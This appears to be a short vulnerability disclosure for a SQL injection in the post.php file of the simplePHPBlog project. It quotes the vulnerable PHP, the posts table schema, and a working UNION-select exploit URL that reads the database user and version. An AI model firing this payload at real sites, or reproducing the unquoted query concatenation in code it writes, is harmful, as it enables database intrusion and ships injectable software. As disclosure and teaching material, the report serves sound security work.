# simplePHPBlog SQL injection #

## Vulnerability link ##

https://github.com/ajamous/simplePHPBlog

## Vulnerability details ##

post.php

	<?php
	    require 'config/db.php';
	    //Get ID of POST
	    $id = mysqli_real_escape_string($conn, $_GET['id']);
	    //create query
	    $query = 'SELECT * FROM posts WHERE id = ' .$id;
	    // get the results
	    $result = mysqli_query($conn, $query);
	    // Fetch Data from database
	    $post = mysqli_fetch_assoc($result);
	    // var_dump is used to test out the query results - enable if needed only
	    //var_dump($posts);
	    // Free the results from memory
	    mysqli_free_result($result);
	    // close connection with MySQL database once you have retreived the data
	    mysqli_close($conn);
	?>

In this code `id` use `mysqli_real_escape_string` but in sql query `$query = 'SELECT * FROM posts WHERE id = ' .$id;` there is no single quotes to use in sql.


	--
	-- Table structure for table `posts`
	--
	
	CREATE TABLE `posts` (
	  `id` int(11) NOT NULL,
	  `title` varchar(255) NOT NULL,
	  `body` text NOT NULL,
	  `author` varchar(255) NOT NULL,
	  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP
	) ENGINE=InnoDB DEFAULT CHARSET=utf8;


 
## exploit: ##

http://target/post.php?id=-1 union select 1,2,user(),version(),5
